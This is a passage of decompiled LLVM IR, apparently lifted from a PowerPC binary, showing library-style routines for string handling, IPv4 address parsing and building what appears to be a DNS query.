  %v4_10011730 = icmp eq i32 %v4_1001172c, %v1_10011730
  %v0_10011734 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v4_10011730, i32 %v0_10011734)
  %v0_10011738 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10011738 = add i32 %v0_10011738, -1
  store i32 %v1_10011738, i32* %ctr.global-to-local, align 4
  %v2_10011738 = icmp eq i32 %v1_10011738, 0
  br i1 %v2_10011738, label %dec_label_pc_1001173c, label %dec_label_pc_1001172c

dec_label_pc_1001173c:                            ; preds = %dec_label_pc_1001172c, %dec_label_pc_10011720
  store i32 0, i32* %r3.global-to-local, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_10011738, { 1, 0 }
  uselistorder i32 %v0_10011720, { 1, 2, 0 }
  uselistorder i32 %v1_1001171c, { 2, 1, 0 }
  uselistorder i32 %v1_100116d4, { 1, 0, 2 }
  uselistorder i32 %v1_100116d0, { 1, 0, 2 }
  uselistorder i32 %v1_100116c0, { 1, 0, 2 }
  uselistorder i32 %v2_1001168c, { 1, 0 }
  uselistorder i32 %v1_10011680, { 1, 0 }
  uselistorder i32 %v0_10011680, { 3, 2, 0, 1 }
  uselistorder i32 %v0_10011684, { 1, 0 }
  uselistorder i32 %v1_10011678, { 1, 0 }
  uselistorder i32 %v0_10011674, { 1, 0, 2 }
  uselistorder i32 %v2_1001165c, { 2, 0, 1, 3 }
  uselistorder i32 %v1_10011654, { 1, 0 }
  uselistorder i32* %r5.global-to-local, { 1, 3, 2, 4, 6, 7, 5, 0 }
  uselistorder i32* %r4.global-to-local, { 0, 1, 3, 2, 4 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 9, 5, 2, 3, 4, 6, 7, 8, 10 }
  uselistorder i32* %ctr.global-to-local, { 0, 3, 4, 1, 5, 6, 2, 7, 8 }
  uselistorder i32 %arg3, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_1001172c, { 1, 0 }
  uselistorder label %dec_label_pc_100116a8, { 1, 0 }
  uselistorder label %dec_label_pc_1001167c, { 1, 0 }
}

define i32 @function_10011744(i32 %arg1) local_unnamed_addr {
dec_label_pc_10011744:
  %r11.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r31.global-to-local, align 4
  %v3_10011750 = icmp eq i32 %arg1, 0
  %v0_10011758 = load i32, i32* @r5, align 4
  store i32 %v0_10011758, i32* %r30.global-to-local, align 4
  %v0_1001175c = load i32, i32* @r4, align 4
  store i32 %v0_1001175c, i32* %r29.global-to-local, align 4
  br i1 %v3_10011750, label %dec_label_pc_10011764, label %dec_label_pc_10011768

dec_label_pc_10011764:                            ; preds = %dec_label_pc_10011744
  %v1_10011764 = inttoptr i32 %v0_10011758 to i32*
  %v2_10011764 = load i32, i32* %v1_10011764, align 4
  store i32 %v2_10011764, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_10011768

dec_label_pc_10011768:                            ; preds = %dec_label_pc_10011744, %dec_label_pc_10011764
  %v0_10011768 = phi i32 [ %arg1, %dec_label_pc_10011744 ], [ %v2_10011764, %dec_label_pc_10011764 ]
  store i32 %v0_10011768, i32* @r3, align 4
  %v1_1001176c = inttoptr i32 %v0_10011768 to i8*
  %v2_1001176c = call i32 @function_100131e4(i8* %v1_1001176c)
  %v0_10011770 = load i32, i32* %r29.global-to-local, align 4
  %v0_10011774 = load i32, i32* %r31.global-to-local, align 4
  %v2_10011774 = add i32 %v0_10011774, %v2_1001176c
  %v3_10011774 = inttoptr i32 %v2_10011774 to i8*
  %v4_10011774 = load i8, i8* %v3_10011774, align 1
  store i32 %v2_10011774, i32* @r31, align 4
  store i32 0, i32* %r9.global-to-local, align 4
  store i32 %v2_10011774, i32* @r3, align 4
  %v3_10011784 = icmp eq i8 %v4_10011774, 0
  br i1 %v3_10011784, label %dec_label_pc_1001178c, label %dec_label_pc_10011794

dec_label_pc_1001178c:                            ; preds = %dec_label_pc_10011768
  %v1_1001178c = load i32, i32* %r30.global-to-local, align 4
  %v2_1001178c = inttoptr i32 %v1_1001178c to i32*
  store i32 %v2_10011774, i32* %v2_1001178c, align 4
  br label %dec_label_pc_100117cc

dec_label_pc_10011794:                            ; preds = %dec_label_pc_10011768
  store i32 268507032, i32* @lr, align 4
  %v4_10011794 = call i32 @function_100117e4(i8* %v3_10011774, i32 %v0_10011770, i32 0)
  store i32 %v4_10011794, i32* %r9.global-to-local, align 4
  %v4_1001179c = icmp eq i32 %v4_10011794, 0
  %v0_100117a0 = load i32, i32* @r31, align 4
  store i32 %v0_100117a0, i32* @r3, align 4
  %v2_100117a4 = add i32 %v4_10011794, 1
  store i32 %v2_100117a4, i32* %r11.global-to-local, align 4
  br i1 %v4_1001179c, label %dec_label_pc_100117ac, label %dec_label_pc_100117bc

dec_label_pc_100117ac:                            ; preds = %dec_label_pc_10011794
  store i32 268507056, i32* @lr, align 4
  %v4_100117ac = call i32 @function_1001305c(i32 %v0_100117a0, i32 0, i32 0)
  %v0_100117b0 = load i32, i32* @r31, align 4
  store i32 %v0_100117b0, i32* %r9.global-to-local, align 4
  %v1_100117b4 = load i32, i32* %r30.global-to-local, align 4
  %v2_100117b4 = inttoptr i32 %v1_100117b4 to i32*
  store i32 %v4_100117ac, i32* %v2_100117b4, align 4
  br label %dec_label_pc_100117cc

dec_label_pc_100117bc:                            ; preds = %dec_label_pc_10011794
  %v1_1001179c = inttoptr i32 %v4_10011794 to i8*
  store i8 0, i8* %v1_1001179c, align 1
  %v0_100117c4 = load i32, i32* @r31, align 4
  store i32 %v0_100117c4, i32* %r9.global-to-local, align 4
  %v0_100117c8 = load i32, i32* %r11.global-to-local, align 4
  %v1_100117c8 = load i32, i32* %r30.global-to-local, align 4
  %v2_100117c8 = inttoptr i32 %v1_100117c8 to i32*
  store i32 %v0_100117c8, i32* %v2_100117c8, align 4
  br label %dec_label_pc_100117cc

dec_label_pc_100117cc:                            ; preds = %dec_label_pc_100117ac, %dec_label_pc_1001178c, %dec_label_pc_100117bc
  %v0_100117d0 = load i32, i32* %r9.global-to-local, align 4
  ret i32 %v0_100117d0

; uselistorder directives
  uselistorder i32 %v4_10011794, { 3, 0, 1, 2 }
  uselistorder i32 %v2_10011774, { 0, 2, 1, 3 }
  uselistorder i32 %v0_10011768, { 1, 0 }
  uselistorder i32* %r9.global-to-local, { 3, 0, 1, 2, 4 }
  uselistorder i32* %r31.global-to-local, { 1, 0, 2 }
  uselistorder label %dec_label_pc_100117cc, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10011768, { 1, 0 }
}

define i32 @function_100117e4(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_100117e4:
  %r11.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %v0_100118041 = load i32, i32* @r3, align 4
  %v1_100118042 = inttoptr i32 %v0_100118041 to i8*
  %v2_100118043 = load i8, i8* %v1_100118042, align 1
  %v3_100118044 = zext i8 %v2_100118043 to i32
  store i32 %v3_100118044, i32* %r11.global-to-local, align 4
  %v3_100118086 = icmp eq i8 %v2_100118043, 0
  br i1 %v3_100118086, label %dec_label_pc_10011818, label %dec_label_pc_10011810

dec_label_pc_100117e8:                            ; preds = %dec_label_pc_100117ec
  %v3_100117ec = zext i8 %v2_100117ec to i32
  %v4_100117f8 = icmp eq i32 %v3_100117ec, %v1_100117f8
  %v0_100117e8 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v4_100117f8, i32 %v0_100117e8)
  %v0_100117ec.pre = load i32, i32* %r9.global-to-local, align 4
  %v1_100117f8.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_100117ec

dec_label_pc_100117ec:                            ; preds = %dec_label_pc_10011810, %dec_label_pc_100117e8
  %v1_100117f8 = phi i32 [ %v1_100117f89, %dec_label_pc_10011810 ], [ %v1_100117f8.pre, %dec_label_pc_100117e8 ]
  %v0_100117ec = phi i32 [ %tmp, %dec_label_pc_10011810 ], [ %v0_100117ec.pre, %dec_label_pc_100117e8 ]
  %v1_100117ec = inttoptr i32 %v0_100117ec to i8*
  %v2_100117ec = load i8, i8* %v1_100117ec, align 1
  %v1_100117f0 = add i32 %v0_100117ec, 1
  store i32 %v1_100117f0, i32* %r9.global-to-local, align 4
  %v3_100117f4 = icmp eq i8 %v2_100117ec, 0
  br i1 %v3_100117f4, label %dec_label_pc_10011800, label %dec_label_pc_100117e8

dec_label_pc_10011800:                            ; preds = %dec_label_pc_100117ec
  %v0_10011800 = load i32, i32* @r3, align 4
  %v1_10011800 = add i32 %v0_10011800, 1
  store i32 %v1_10011800, i32* @r3, align 4
  %v1_10011804 = inttoptr i32 %v1_10011800 to i8*
  %v2_10011804 = load i8, i8* %v1_10011804, align 1
  %v3_10011804 = zext i8 %v2_10011804 to i32
  store i32 %v3_10011804, i32* %r11.global-to-local, align 4
  %v3_10011808 = icmp eq i8 %v2_10011804, 0
  br i1 %v3_10011808, label %dec_label_pc_10011818, label %dec_label_pc_10011810

dec_label_pc_10011810:                            ; preds = %dec_label_pc_100117e4, %dec_label_pc_10011800
  %v1_100117f89 = phi i32 [ %v3_10011804, %dec_label_pc_10011800 ], [ %v3_100118044, %dec_label_pc_100117e4 ]
  store i32 %tmp, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_100117ec

dec_label_pc_10011818:                            ; preds = %dec_label_pc_10011800, %dec_label_pc_100117e4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v0_100117ec, { 1, 0 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i32* %r9.global-to-local, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10011810, { 1, 0 }
}

define i32 @function_10011820(i8* %arg1) local_unnamed_addr {
dec_label_pc_10011820:
  %r5.global-to-local = alloca i32, align 4
  %v3_10011820 = icmp eq i8* %arg1, null
  br i1 %v3_10011820, label %dec_label_pc_100118d8, label %dec_label_pc_10011828

dec_label_pc_10011828:                            ; preds = %dec_label_pc_10011820
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 0, i32* %r5.global-to-local, align 4
  %v3_1001183c.pre = load i32, i32* @global_var_1002b8c0, align 4
  br label %dec_label_pc_10011838

dec_label_pc_10011838:                            ; preds = %dec_label_pc_10011828, %dec_label_pc_100118b0
  %v0_100118b0 = phi i32 [ 0, %dec_label_pc_10011828 ], [ %v2_100118b8, %dec_label_pc_100118b0 ]
  %v0_100118b4 = phi i32 [ 1, %dec_label_pc_10011828 ], [ %v1_100118b4, %dec_label_pc_100118b0 ]
  %v0_10011838 = phi i32 [ %tmp, %dec_label_pc_10011828 ], [ %v0_100118383, %dec_label_pc_100118b0 ]
  %v1_10011838 = inttoptr i32 %v0_10011838 to i8*
  %v2_10011838 = load i8, i8* %v1_10011838, align 1
  %v3_10011838 = zext i8 %v2_10011838 to i32
  %v1_10011840 = mul nuw nsw i32 %v3_10011838, 2
  %v2_10011844 = add i32 %v1_10011840, %v3_1001183c.pre
  %v3_10011844 = inttoptr i32 %v2_10011844 to i16*
  %v4_10011844 = load i16, i16* %v3_10011844, align 2
  %v1_10011848 = and i16 %v4_10011844, 8
  %v3_10011848 = icmp eq i16 %v1_10011848, 0
  br i1 %v3_10011848, label %dec_label_pc_100118d8, label %dec_label_pc_10011850

dec_label_pc_10011850:                            ; preds = %dec_label_pc_10011838
  br label %dec_label_pc_10011868

dec_label_pc_10011858:                            ; preds = %dec_label_pc_10011868
  %v1_1001186c = mul i32 %v1_100118b8, 10
  %v2_10011874 = add i32 %v3_10011868, %v1_1001186c
  %v1_10011858 = add i32 %v2_10011874, -48
  %v1_1001185c = add i32 %v0_100118a0, 1
  %v2_10011860 = icmp sgt i32 %v1_10011858, 255
  br i1 %v2_10011860, label %dec_label_pc_100118d8, label %dec_label_pc_10011868

dec_label_pc_10011868:                            ; preds = %dec_label_pc_10011858, %dec_label_pc_10011850
  %v1_100118b8 = phi i32 [ %v1_10011858, %dec_label_pc_10011858 ], [ 0, %dec_label_pc_10011850 ]
  %v0_100118a0 = phi i32 [ %v1_1001185c, %dec_label_pc_10011858 ], [ %v0_10011838, %dec_label_pc_10011850 ]
  %v1_10011868 = inttoptr i32 %v0_100118a0 to i8*
  %v2_10011868 = load i8, i8* %v1_10011868, align 1
  %v3_10011868 = zext i8 %v2_10011868 to i32
  %v1_10011870 = mul nuw nsw i32 %v3_10011868, 2
  %v2_10011878 = add i32 %v1_10011870, %v3_1001183c.pre
  %v3_10011878 = inttoptr i32 %v2_10011878 to i16*
  %v4_10011878 = load i16, i16* %v3_10011878, align 2
  %v5_10011878 = zext i16 %v4_10011878 to i32
  %v1_1001187c = and i32 %v5_10011878, 8
  %v3_1001187c = icmp eq i32 %v1_1001187c, 0
  br i1 %v3_1001187c, label %dec_label_pc_10011884, label %dec_label_pc_10011858

dec_label_pc_10011884:                            ; preds = %dec_label_pc_10011868
  %v2_10011884 = icmp sgt i32 %v0_100118b4, 3
  br i1 %v2_10011884, label %dec_label_pc_1001189c, label %dec_label_pc_1001188c

dec_label_pc_1001188c:                            ; preds = %dec_label_pc_10011884
  %v3_1001188c = icmp eq i8 %v2_10011868, 46
  br i1 %v3_1001188c, label %dec_label_pc_10011894, label %dec_label_pc_100118d8

dec_label_pc_10011894:                            ; preds = %dec_label_pc_1001188c
  %v1_10011894 = add i32 %v0_100118a0, 1
  br label %dec_label_pc_100118b0

dec_label_pc_1001189c:                            ; preds = %dec_label_pc_10011884
  %v3_1001189c = icmp eq i8 %v2_10011868, 0
  %v1_100118a0 = add i32 %v0_100118a0, 1
  br i1 %v3_1001189c, label %dec_label_pc_100118b0, label %dec_label_pc_100118a8

dec_label_pc_100118a8:                            ; preds = %dec_label_pc_1001189c
  %v1_100118a8 = and i32 %v5_10011878, 32
  %v3_100118a8 = icmp eq i32 %v1_100118a8, 0
  br i1 %v3_100118a8, label %dec_label_pc_100118d8, label %dec_label_pc_100118b0

dec_label_pc_100118b0:                            ; preds = %dec_label_pc_100118a8, %dec_label_pc_1001189c, %dec_label_pc_10011894
  %v0_100118383 = phi i32 [ %v1_100118a0, %dec_label_pc_100118a8 ], [ %v1_100118a0, %dec_label_pc_1001189c ], [ %v1_10011894, %dec_label_pc_10011894 ]
  %v1_100118b0 = mul i32 %v0_100118b0, 256
  %v1_100118b4 = add nuw nsw i32 %v0_100118b4, 1
  %v2_100118b8 = or i32 %v1_100118b8, %v1_100118b0
  store i32 %v2_100118b8, i32* %r5.global-to-local, align 4
  %tmp10 = icmp slt i32 %v1_100118b4, 5
  br i1 %tmp10, label %dec_label_pc_10011838, label %dec_label_pc_100118c4

dec_label_pc_100118c4:                            ; preds = %dec_label_pc_100118b0
  %v0_100118c4 = load i32, i32* @r4, align 4
  %v3_100118c4 = icmp eq i32 %v0_100118c4, 0
  %v0_100118cc = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_100118c4, i32 %v0_100118cc)
  %v0_100118d0 = load i32, i32* %r5.global-to-local, align 4
  %v1_100118d0 = load i32, i32* @r4, align 4
  %v2_100118d0 = inttoptr i32 %v1_100118d0 to i32*
  store i32 %v0_100118d0, i32* %v2_100118d0, align 4
  ret i32 1

dec_label_pc_100118d8:                            ; preds = %dec_label_pc_1001188c, %dec_label_pc_100118a8, %dec_label_pc_10011838, %dec_label_pc_10011858, %dec_label_pc_10011820
  ret i32 0

; uselistorder directives
  uselistorder i32 %v2_100118b8, { 1, 0 }
  uselistorder i32 %v1_100118b4, { 1, 0 }
  uselistorder i32 %v0_100118a0, { 0, 1, 3, 2 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_100118d8, { 1, 0, 3, 2, 4 }
  uselistorder label %dec_label_pc_10011838, { 1, 0 }
}

define i32 @function_100118e0(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
dec_label_pc_100118e0:
  %r0.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r14.global-to-local = alloca i32, align 4
  %r15.global-to-local = alloca i32, align 4
  %r16.global-to-local = alloca i32, align 4
  %r17.global-to-local = alloca i32, align 4
  %r18.global-to-local = alloca i32, align 4
  %r28.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %tmp28 = call i32 @__decompiler_undefined_function_0()
  %tmp29 = call i32 @__decompiler_undefined_function_0()
  %tmp33 = call i32 @__decompiler_undefined_function_0()
  %tmp35 = call i32 @__decompiler_undefined_function_0()
  %tmp36 = call i32 @__decompiler_undefined_function_0()
  %tmp37 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-184 = alloca i32, align 4
  %stack_var_-248 = alloca i32, align 4
  %stack_var_-212 = alloca i16, align 2
  %stack_var_-204 = alloca i32, align 4
  %stack_var_-240 = alloca i32, align 4
  %stack_var_-144 = alloca i32, align 4
  %stack_var_-228 = alloca i32, align 4
  %v0_100118e4 = load i32, i32* @lr, align 4
  store i32 %v0_100118e4, i32* %r0.global-to-local, align 4
  store i32 %tmp, i32* %r14.global-to-local, align 4
  store i32 %arg2, i32* %r16.global-to-local, align 4
  store i32 %arg3, i32* @r23, align 4
  store i32 268507408, i32* @lr, align 4
  %v1_1001190c = call i32 @function_1000ef60(i32 512)
  store i32 %v1_1001190c, i32* @r30, align 4
  store i32 268507420, i32* @lr, align 4
  %v1_10011918 = call i32 @function_1000ef60(i32 1025)
  %v0_1001191c = load i32, i32* @r30, align 4
  %v3_1001191c = icmp eq i32 %v0_1001191c, 0
  store i32 %v1_10011918, i32* @r21, align 4
  br i1 %v3_1001191c, label %dec_label_pc_10011ed8, label %dec_label_pc_10011928

dec_label_pc_10011928:                            ; preds = %dec_label_pc_100118e0
  %v3_10011928 = icmp eq i32 %v1_10011918, 0
  br i1 %v3_10011928, label %dec_label_pc_10011ed8, label %dec_label_pc_10011930

dec_label_pc_10011930:                            ; preds = %dec_label_pc_10011928
  %v0_10011930 = load i32, i32* @r23, align 4
  %v3_10011930 = icmp eq i32 %v0_10011930, 0
  br i1 %v3_10011930, label %dec_label_pc_10011ed8, label %dec_label_pc_10011938

dec_label_pc_10011938:                            ; preds = %dec_label_pc_10011930
  %v0_10011938 = load i32, i32* %r14.global-to-local, align 4
  %v1_10011938 = inttoptr i32 %v0_10011938 to i8*
  %v2_10011938 = load i8, i8* %v1_10011938, align 1
  %v3_10011938 = zext i8 %v2_10011938 to i32
  store i32 %v3_10011938, i32* %r0.global-to-local, align 4
  %v3_1001193c = icmp eq i8 %v2_10011938, 0
  br i1 %v3_1001193c, label %dec_label_pc_10011ed8, label %dec_label_pc_10011944

dec_label_pc_10011944:                            ; preds = %dec_label_pc_10011938
  store i32 %v0_10011938, i32* @r3, align 4
  store i32 ptrtoint (i32* @global_var_10030000.1 to i32), i32* %r29.global-to-local, align 4
  %v0_1001194c = call i32 @function_1000df60()
  %v0_10011954 = load i32, i32* %r14.global-to-local, align 4
  %v2_10011954 = add i32 %v0_10011954, %v0_1001194c
  %v1_1001195c = add i32 %v2_10011954, -1
  %v2_1001195c = inttoptr i32 %v1_1001195c to i8*
  %v3_1001195c = load i8, i8* %v2_1001195c, align 1
  %v4_1001195c = zext i8 %v3_1001195c to i32
  store i32 %v4_1001195c, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_10031ba0.802 to i32), i32* %r29.global-to-local, align 4
  %v2_10011964 = ptrtoint i32* %stack_var_-228 to i32
  store i32 %v2_10011964, i32* %r28.global-to-local, align 4
  store i32 %v2_10011964, i32* @r3, align 4
  store i32 -1, i32* @r19, align 4
  %v1_10011974 = xor i32 %v4_1001195c, 46
  store i32 %v1_10011974, i32* %r17.global-to-local, align 4
  %v0_10011978 = call i32 @function_10010048()
  %v1_10011980 = call i32 @llvm.ctlz.i32(i32 %v1_10011974, i1 true)
  store i32 %v1_10011980, i32* %r17.global-to-local, align 4
  %v0_10011984 = call i32 @function_10010040()
  %v3_1001198c = load i32, i32* @global_var_1002b960.803, align 4
  store i32 %v3_1001198c, i32* %r11.global-to-local, align 4
  %v3_10011994 = load i16, i16* @global_var_1002b86c.804, align 2
  %v4_10011994 = zext i16 %v3_10011994 to i32
  store i32 %v4_10011994, i32* @r25, align 4
  store i32 %v2_10011964, i32* @r3, align 4
  store i32 0, i32* %r17.global-to-local, align 4
  %v1_100119a4 = load i32, i32* @r23, align 4
  store i32 0, i32* %r18.global-to-local, align 4
  store i32 -1, i32* @r22, align 4
  %v2_100119a4 = srem i32 %v3_1001198c, %v1_100119a4
  %v2_100119b0 = sub i32 %v3_1001198c, %v2_100119a4
  store i32 %v2_100119b0, i32* %r0.global-to-local, align 4
  store i32 %v2_100119a4, i32* @r26, align 4
  %v0_100119b8 = call i32 @function_10010048()
  %v0_10011ecc.pr19 = load i32, i32* %r18.global-to-local, align 4
  %tmp57 = icmp ult i32 %v0_10011ecc.pr19, 3
  br i1 %tmp57, label %dec_label_pc_100119c0.lr.ph.lr.ph, label %dec_label_pc_10011ee4

dec_label_pc_100119c0.lr.ph.lr.ph:                ; preds = %dec_label_pc_10011944
  %v2_100119d8 = ptrtoint i32* %stack_var_-144 to i32
  %v2_10011aec = ptrtoint i32* %stack_var_-204 to i32
  %v2_10011b4c = ptrtoint i16* %stack_var_-212 to i32
  %v2_10011b90 = ptrtoint i32* %stack_var_-248 to i32
  %v3_10011bec = icmp eq i32 %tmp37, 0
  %v3_10011bf8 = icmp eq i32 %tmp36, 3
  %v2_10011c74 = icmp sgt i32 %tmp35, 0
  %tmp58 = icmp slt i32 %tmp35, 1
  %v2_10011cc8 = ptrtoint i32* %stack_var_-184 to i32
  %v3_10011cf4 = icmp eq i32 %tmp33, 0
  %v3_10011c68 = icmp eq i32 %tmp36, 0
  br label %dec_label_pc_100119c0.lr.ph

dec_label_pc_100119c0:                            ; preds = %dec_label_pc_100119c0.lr.ph, %dec_label_pc_10011b70
  %v0_100119c0 = load i32, i32* @r19, align 4
  %v3_100119c0 = icmp eq i32 %v0_100119c0, -1
  br i1 %v3_100119c0, label %dec_label_pc_100119d0, label %dec_label_pc_100119c8

dec_label_pc_100119c8:                            ; preds = %dec_label_pc_100119c0
  store i32 268507600, i32* @lr, align 4
  %v1_100119cc = call i32 @function_1000c2f4(i32 %v0_100119c0)
  br label %dec_label_pc_100119d0

dec_label_pc_100119d0:                            ; preds = %dec_label_pc_100119c0, %dec_label_pc_100119c8
  store i32 %v2_100119d8, i32* %r29.global-to-local, align 4
  %v0_100119dc = load i32, i32* @r30, align 4
  store i32 268507620, i32* @lr, align 4
  %v3_100119e0 = call i32 @function_1000dd4c(i32 %v0_100119dc, i32 0, i32 512)
  store i32 268507636, i32* @lr, align 4
  %v3_100119f0 = call i32 @function_1000dd4c(i32 %v2_100119d8, i32 0, i32 48)
  %v0_100119f4 = load i32, i32* @r25, align 4
  %v1_100119f4 = add i32 %v0_100119f4, 1
  %v1_100119f8 = urem i32 %v1_100119f4, 65536
  store i32 %v1_100119f8, i32* @r25, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  %v0_10011a04 = load i32, i32* @r30, align 4
  store i32 %v1_100119f8, i32* %stack_var_-144, align 4
  %v4_10011a18 = call i32 @function_10013970(i32* nonnull %stack_var_-144, i32 %v0_10011a04, i32 512)
  store i32 %v4_10011a18, i32* %r28.global-to-local, align 4
  %v1_10011a1c = icmp slt i32 %v4_10011a18, 0
  br i1 %v1_10011a1c, label %dec_label_pc_10011ee4, label %dec_label_pc_10011a24

dec_label_pc_10011a24:                            ; preds = %dec_label_pc_100119d0
  %v0_10011a24 = load i32, i32* %r14.global-to-local, align 4
  store i32 %v0_10011a24, i32* @r4, align 4
  %v0_10011a2c = load i32, i32* @r21, align 4
  store i32 ptrtoint (i32* @global_var_10030000.1 to i32), i32* %r29.global-to-local, align 4
  store i32 268507704, i32* @lr, align 4
  %v4_10011a34 = call i32 @function_1000e004(i32 %v0_10011a2c, i32 %v0_10011a24, i32 1025)
  store i32 ptrtoint (i32* @global_var_1002b870.749 to i32), i32* %r29.global-to-local, align 4
  store i32 %v2_10011964, i32* @r3, align 4
  %v0_10011a4c = call i32 @function_10010048()
  %v0_10011a54 = call i32 @function_10010040()
  %v0_10011a5c = load i32, i32* @r22, align 4
  %v1_10011a5c = icmp slt i32 %v0_10011a5c, 0
  %v0_10011a60 = load i32, i32* @r26, align 4
  %v1_10011a60 = mul i32 %v0_10011a60, 4
  store i32 %v1_10011a60, i32* %r0.global-to-local, align 4
  %v2_10011a64 = add i32 %v1_10011a60, %arg4
  %v3_10011a64 = inttoptr i32 %v2_10011a64 to i32*
  %v4_10011a64 = load i32, i32* %v3_10011a64, align 4
  store i32 %v4_10011a64, i32* %r29.global-to-local, align 4
  br i1 %v1_10011a5c, label %dec_label_pc_10011aac, label %dec_label_pc_10011a6c

dec_label_pc_10011a6c:                            ; preds = %dec_label_pc_10011a24
  %v3_10011a70 = load i32, i32* @global_var_1002b968.806, align 4
  store i32 %v3_10011a70, i32* %r0.global-to-local, align 4
  %v2_10011a74 = icmp slt i32 %v0_10011a5c, %v3_10011a70
  br i1 %v2_10011a74, label %dec_label_pc_10011a7c, label %dec_label_pc_10011aac

dec_label_pc_10011a7c:                            ; preds = %dec_label_pc_10011a6c
  store i32 ptrtoint (i32* @global_var_1001a4f0.807 to i32), i32* @r4, align 4
  %v0_10011a88 = load i32, i32* @r21, align 4
  store i32 268507792, i32* @lr, align 4
  %v4_10011a8c = inttoptr i32 %v0_10011a88 to i8*
  %v5_10011a8c = call i32 @function_10013114(i8* %v4_10011a8c, i32 ptrtoint (i32* @global_var_1001a4f0.807 to i32), i32 1025, i32 ptrtoint (i32* @global_var_10030000.1 to i32))
  %v0_10011a94 = load i32, i32* @r22, align 4
  %v1_10011a94 = mul i32 %v0_10011a94, 4
  store i32 %v1_10011a94, i32* %r0.global-to-local, align 4
  %v2_10011a9c = add i32 %v1_10011a94, ptrtoint (i32* @global_var_10031c50.808 to i32)
  %v3_10011a9c = inttoptr i32 %v2_10011a9c to i32*
  %v4_10011a9c = load i32, i32* %v3_10011a9c, align 4
  store i32 %v4_10011a9c, i32* @r4, align 4
  %v0_10011aa0 = load i32, i32* @r21, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10011aac.809 to i32), i32* @lr, align 4
  %v4_10011aa8 = inttoptr i32 %v0_10011aa0 to i8*
  %v5_10011aa8 = call i32 @function_10013114(i8* %v4_10011aa8, i32 %v4_10011a9c, i32 1025, i32 ptrtoint (i32* @global_var_10031c50.808 to i32))
  br label %dec_label_pc_10011aac

dec_label_pc_10011aac:                            ; preds = %dec_label_pc_10011a6c, %dec_label_pc_10011a24, %dec_label_pc_10011a7c
  store i32 %v2_10011964, i32* @r3, align 4
  %v0_10011ab4 = call i32 @function_10010048()
  store i32 1, i32* %r0.global-to-local, align 4
  %v0_10011ac0 = load i32, i32* @r30, align 4
  %v1_10011ac0 = load i32, i32* %r28.global-to-local, align 4
  %v2_10011ac0 = add i32 %v1_10011ac0, %v0_10011ac0
  %v1_10011ac4 = sub i32 512, %v1_10011ac0
  %v0_10011acc = load i32, i32* @r21, align 4
  store i32 %v0_10011acc, i32* %stack_var_-240, align 4
  store i32 268507864, i32* @lr, align 4
  %v4_10011ad4 = call i32 @function_10013b20(i32* nonnull %stack_var_-240, i32 %v2_10011ac0, i32 %v1_10011ac4)
  store i32 %v4_10011ad4, i32* @r27, align 4
  %v1_10011ad8 = icmp slt i32 %v4_10011ad4, 0
  br i1 %v1_10011ad8, label %dec_label_pc_10011ee4, label %dec_label_pc_10011ae0

dec_label_pc_10011ae0:                            ; preds = %dec_label_pc_10011aac
  store i32 2, i32* %r0.global-to-local, align 4
  %v0_10011ae8 = load i32, i32* @r29, align 4
  store i16 2, i16* %stack_var_-212, align 2
  store i32 268507896, i32* @lr, align 4
  %v3_10011af4 = inttoptr i32 %v0_10011ae8 to i8*
  %v4_10011af4 = call i32 @function_10013360(i32 10, i8* %v3_10011af4, i32 %v2_10011aec)
  %tmp59 = icmp slt i32 %v4_10011af4, 1
  br i1 %tmp59, label %dec_label_pc_10011b08thread-pre-split, label %dec_label_pc_10011b00

dec_label_pc_10011b00:                            ; preds = %dec_label_pc_10011ae0
  store i32 10, i32* %r0.global-to-local, align 4
  store i16 10, i16* %stack_var_-212, align 2
  br label %dec_label_pc_10011b08

dec_label_pc_10011b08thread-pre-split:            ; preds = %dec_label_pc_10011ae0
  %v3_10011b08.pr = load i16, i16* %stack_var_-212, align 2
  br label %dec_label_pc_10011b08

dec_label_pc_10011b08:                            ; preds = %dec_label_pc_10011b08thread-pre-split, %dec_label_pc_10011b00
  %v3_10011b08 = phi i16 [ %v3_10011b08.pr, %dec_label_pc_10011b08thread-pre-split ], [ 10, %dec_label_pc_10011b00 ]
  %v3_10011b0c = icmp eq i16 %v3_10011b08, 10
  store i32 53, i32* %r0.global-to-local, align 4
  br i1 %v3_10011b0c, label %dec_label_pc_10011b34, label %dec_label_pc_10011b20

dec_label_pc_10011b20:                            ; preds = %dec_label_pc_10011b08
  %v0_10011b24 = load i32, i32* @r29, align 4
  store i32 268507952, i32* @lr, align 4
  %v1_10011b2c = call i32 @function_1000e800(i32 %v0_10011b24)
  %v3_10011b34.pre = load i16, i16* %stack_var_-212, align 2
  br label %dec_label_pc_10011b34

dec_label_pc_10011b34:                            ; preds = %dec_label_pc_10011b08, %dec_label_pc_10011b20
